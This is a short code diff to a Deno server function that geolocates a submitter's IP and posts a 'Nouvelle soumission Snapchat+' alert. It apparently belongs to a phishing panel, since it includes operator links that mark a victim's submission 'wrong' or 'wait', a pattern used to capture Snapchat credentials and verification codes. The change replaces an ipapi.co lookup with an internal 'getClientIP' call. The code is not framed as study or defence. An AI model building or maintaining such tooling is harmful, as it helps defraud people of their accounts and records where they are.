@@ -49,14 +49,9 @@ Deno.serve(async (req) => {
   const wrongUrl = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
   const waitUrl = `${appUrl}/?triggerAction=wait&id=${submissionId}`;
 
-  const geoResponse = await fetch("https://ipapi.co/" + ip + "/json/").catch(() => null);
-  let geoData = { country_name: "France", city: "Inconnue" };
-  if (geoResponse?.ok) {
-    geoData = await geoResponse.json();
-  }
-
-  const country = geoData.country_name || "France";
-  const city = geoData.city || "Inconnue";
+  const geoRes = await base44.functions.invoke("getClientIP", {}).catch(() => ({}));
+  const country = geoRes?.data?.country || "France";
+  const city = geoRes?.data?.city || "Inconnue";
 
   const embed = {
     title: "📱 Nouvelle soumission Snapchat+",
